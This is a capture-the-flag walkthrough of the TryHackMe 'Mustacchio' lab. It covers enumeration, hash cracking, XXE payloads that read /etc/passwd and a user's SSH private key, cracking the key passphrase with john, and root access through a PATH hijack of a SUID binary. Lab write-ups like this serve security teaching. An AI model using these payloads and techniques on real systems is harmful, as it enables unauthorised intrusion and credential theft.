# Mustacchio | THM
###  Difficulty: Easy
---------------------------------------

First, we start to enumerate the target machine with nmap:

```bash
nmap -sC -sV -p- <ip-address>
```
Results:

![image](https://cdn-images-1.medium.com/max/1000/1*YF-bOmF3rjDF9vw9fPC7Ww.png)

So, we got 3 open ports. port 22 of SSH, port 80 and port 8765 for HTTP.
I thought about running Gobuster to find a hidden directories
but as we can see there is login page in port 8765, let’s check it out:

![image](https://cdn-images-1.medium.com/max/1000/1*TmKztsvS77bBfQXcOQO2HQ.png)

mmm.. so at that point I don't know what to do. maybe I’ll try Gobuster?

```bash
gobuster dir -u <IP-address> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Results:

![image](https://cdn-images-1.medium.com/max/1000/1*aHDbs3iQZ149ljeatO_bKw.png)

let's enter to the custom directory.
oh! I found an interesting file , "users.bak".

![image](https://cdn-images-1.medium.com/max/1000/1*AMQ8-73z48MEKHjV32FE1A.png)

After downloading the file, let's read it.

![image](https://cdn-images-1.medium.com/max/1000/1*1kOopkfnWH_tTbu2FqEfow.png)

we got credentials with username admin and a hash. 
I'm going to insert that hash to rainbow table: https://crackstation.net/

![image](https://cdn-images-1.medium.com/max/1000/1*mKo0PVohWF6LDlkiSse6cw.png)

So, we have username and password. Hence, it means that is the time to enter the admin panel.
After entering to the admin panel we got a comment panel and 
there is an option to include remote code execution a.k.a RCE.

![image](https://cdn-images-1.medium.com/max/1000/1*zHGYPFLXX_fjp0A_0JDlrQ.png)

Before that, let's analyze the web app to understand which vulnerability we can exploit and which code type is needed for the injection.
lets check what the response to click on submit button. after clicking it we got this alert.

![image](https://cdn-images-1.medium.com/max/1000/1*TgoQIAePBDdV-PY3GvBGww.png)

this web app isn't secure at all! it just writing us the vulnerability. lets exploit it.
But, what should I do here? maybe there is some info in the source code of that page?!

![image](https://cdn-images-1.medium.com/max/1000/1*-V9RWYUT1e3tQN2DK_t1kw.png)

So there is an interesting path to a file : "/auth/dontforget.bak" .
when insert the path in the URL, this file downloaded automatically.
lets read it:

![image](https://cdn-images-1.medium.com/max/1000/1*SW8ltX0FgS9V3RdP-Gq-sA.png)

The content of the message is irrelevant but the structure of it going to help us to inject a malicious code. 
in addition, we found a message to user Barry in the source code.
<! - Barry, you can now SSH in using your key! →
but how can I achieve that key? so I'll use the structure of the message and insert it a path to if is there any reflection..

```bash
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 <comment>
 <name>Joe Hamd</name>
 <author>Barry Clad</author>
 <com>&xxe;</com>
 </comment>
```

so after injecting xml entity with a path to passwd ,I got a reflection!

![image](https://cdn-images-1.medium.com/max/1000/1*SHfHXKFQ2b5PBtmRtSWCjQ.png)

It's the time to travel into the SSH directory and pull the key from the reflection. just change the path:

```bash
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
 <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
 <comment>
 <name>Joe Hamd</name>
 <author>Barry Clad</author>
 <com>&xxe;</com>
 </comment>
```

and there is the key!

![image](https://cdn-images-1.medium.com/max/1000/1*1syCElthWK9jhlwKZrmQ2g.png)

the username and the key are found. lets attack the SSH service with pass the key attack. 
copy the key and insert it to a file in your kali, the next step is to change the permissions.

```bash
chmod 600 key.txt
ssh barry@<ip-address> -i key.txt
```


oh no, there is a passphrase for the key..

![image](https://cdn-images-1.medium.com/max/1000/1*VRZSLFlPBTBKb0MJZ4v5_A.png)

but don't worry, ssh2john will solve it.

```bash
ssh2john key.txt > newkey1.txt
```

Crack it with john.
```bash
john newkey1.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

 The passphrase: 

 ![image](https://cdn-images-1.medium.com/max/1000/1*I1KWBiHMJL6UQFzpvFiisg.png)

and we are in! user.txt too!

![image](https://cdn-images-1.medium.com/max/1000/1*_m7iGJ4x0YfbbJjRZNquOQ.png)

*Privilege escalation*

Where is root.txt?
I can't find any helpful info in /home/ barry so I moved back to /home to check if is there any other user.
there is! joe. let's check which content can i find.

![image](https://cdn-images-1.medium.com/max/1000/1*41a27O-ewKMO8yE23dtQ-A.png)

I'll try that command to find suid and gid files under root:
```bash
find / -user root -perm /4000 2>/dev/null
```

Results:

![image](https://cdn-images-1.medium.com/max/1000/1*f3Yv4idHoRcP4sRPMJhEYg.png)

as we can see the path of the file is there so we can exploit it.
let's check if we got any permission on that file:

![image](https://cdn-images-1.medium.com/max/1000/1*WwhA0zVEGvaMxSBWnhqe7g.png)

so we got execute permission. it means that we can use strings too.
```bash
strings live_log
```

Results:

![image](https://cdn-images-1.medium.com/max/1200/1*EJ6m8CfCx4e1Ev85lUeReA.png)

that tail command is intersting!
what if are we going to hijack the path with binary file "tail"? lets do it.
first we need permission to write a new file so /tmp is the dir for that.
we are going to inject "/bin/bash" to that file to get root!

![image](https://cdn-images-1.medium.com/max/1200/1*Ja9hyX9Puj4uX2v-xl7UqQ.png)

open the file.
and we got it!

![image](https://cdn-images-1.medium.com/max/1200/1*hS7wjCQUcpGf8GS6JP9ppw.png)

The end!

Happy Hacking!

*Written by Alon Presman, Penetration Tester and Ethical Hacker.*

































 










































